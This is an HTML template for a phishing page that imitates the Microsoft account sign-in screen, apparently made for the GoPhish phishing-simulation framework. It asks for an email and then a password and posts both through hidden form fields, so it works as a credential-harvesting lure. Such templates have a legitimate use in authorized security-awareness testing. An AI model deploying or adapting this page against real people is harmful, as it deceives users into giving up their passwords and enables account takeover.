<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <form method="POST" id="gophish_form">
        <input type="hidden" name="username" id="hidden_username">
        <input type="hidden" name="password" id="hidden_password">
        
        <div class="container">
            <div class="logo">
                <img src="https://logowik.com/content/uploads/images/microsoft-logo_2021.jpg" alt="Microsoft Logo" height="25">
            </div>

            <div id="step_username">
                <div class="title">Sign in</div>
                <input type="email" id="input_username" class="input-text" placeholder="Email, phone, or Skype" required>
                
                <a href="#" class="link">No account? Create one!</a>
                <a href="#" class="link">Can't access your account?</a>
                
                <div class="button-group">
                    <button type="button" class="button-back" style="display: none;">Back</button>
                    <button type="button" class="button-next" onclick="showPasswordStep()">Next</button>
                </div>
            </div>

            <div id="step_password" style="display: none;">
                <a href="#" class="username-link" onclick="showUsernameStep()">
                    &#x2190; <span id="displayed_username">{{.Email}}</span>
                </a>
                
                <div class="title" style="margin-top: 5px;">Enter password</div>
                <input type="password" id="input_password" class="input-text" placeholder="Password" required>
                
                <a href="#" class="link" style="margin-bottom: 10px;">Forgot my password</a>
                
                <div class="button-group">
                    <button type="submit" class="button-signin">Sign in</button>
                </div>
            </div>
        </div>
        
        <div class="sign-in-options">
             <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAPCAYAAAA71pVKAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnbFJlYWR5ccllPAAAAHNJREFUeNpiYGBg+A/i/2A2n5FVAyMzAzOQjFhBwK/IByB+AGM8N8jQf1AG+WdKpgF/g/g0q8Afx/S6A/8D8WfF+A+Gf0B+C1z0vY5pEwz4D8L/C7Gz/D+B/Hq9r/oA5M70f/MHEzFUMAAQYA4b97N47WvIAAAAASUVORK5CYII=" alt="Sign-in icon">
            Sign-in options
        </div>
    </form>


    <div class="footer-links">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <a href="#">...</a>
    </div>

    <script src="script.js"></script>

</body>
</html>
